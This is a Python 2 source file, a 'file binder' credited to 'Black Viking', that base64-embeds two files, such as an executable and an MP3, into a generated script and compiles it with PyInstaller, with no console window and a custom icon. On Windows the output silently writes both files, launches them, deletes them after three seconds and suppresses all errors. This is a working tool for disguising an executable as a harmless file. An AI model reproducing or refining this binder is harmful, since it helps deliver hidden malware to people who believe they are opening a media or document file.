#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
Python file binder.

Usage:
	~$ python2 binder.py file1.exe file2.mp3 newExe.exe icon.ico
"""

__author__ = "Black Viking"
__date__   = "22.04.2017"

import os
import sys
import base64
import shutil
import subprocess

def generatePyBinder(name, f1name, f2name, f1, f2):
	''' File binder template '''
	
	template = """
import os
import sys
import time
import base64

def main():
	file1Name = "%s"
	file2Name = "%s"
	file1binary = base64.b64decode("%s")
	file2binary = base64.b64decode("%s")

	file1 = open(file1Name, "wb")
	file1.write(file1binary)
	file1.flush()
	file1.close()

	file2 = open(file2Name, "wb")
	file2.write(file2binary)
	file2.flush()
	file2.close()

	os.startfile(file1Name)
	os.startfile(file2Name)

	time.sleep(3)

	os.remove(file1Name)
	os.remove(file2Name)

if __name__ == "__main__":
	if os.name == "nt":
		try:
			main()
		except:
			pass

	else:
		sys.exit()"""%(f1name, f2name, f1, f2)

	file = open(name+".py", "w")
	file.write(template)
	file.flush()
	file.close()

	return name+".py"

def generateExec(pyName, iconName):
	''' Generate new exe file '''
	
	cmd = subprocess.Popen(['pyinstaller', "--onefile", '--noconsole',"--icon=%s"%(iconName), pyName], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	stdout, nothing = cmd.communicate()

	file = "dist" + os.sep + pyName.split(".")[0]+".exe"
	shutil.copy2(file, "..")

	os.chdir("..")
	shutil.rmtree("exec")

	print "\n[+] Exe file ==> %s"%(os.getcwd()+os.sep+pyName.split(".")[0]+".exe")


def main():
	''' Main Function '''
	
	if len(sys.argv) == 5:

		file1Name  = sys.argv[1]
		file2Name  = sys.argv[2]
		newExeName = sys.argv[3]
		iconName   = os.getcwd()+os.sep+sys.argv[4]

		file1binary = base64.b64encode(open(file1Name, "rb").read())
		file2binary = base64.b64encode(open(file2Name, "rb").read())

		if os.path.exists("exec") == True:
			os.chdir("exec")
		else:
			os.mkdir("exec")
			os.chdir("exec")

		print """
[*] File     : %s
[*] File     : %s
[*] New File : %s
"""%(file1Name, file2Name, newExeName)
		generateExec(generatePyBinder(newExeName, file1Name, file2Name, file1binary, file2binary), iconName)

	else:
		print r"""
Usage:
	~$ python2 binder.py file1.exe file2.mp3 newExe.exe icon.ico
	~$ python2 binder.py test.exe test.txt newExe.exe ico.ico

	[*] File     : test.exe
	[*] File     : test.txt
	[*] New File : newExe.exe

	[+] Exe file ==> C:\Users\user\Desktop\binder\newExe.exe"""
		sys.exit()

if __name__ == "__main__":
	main()
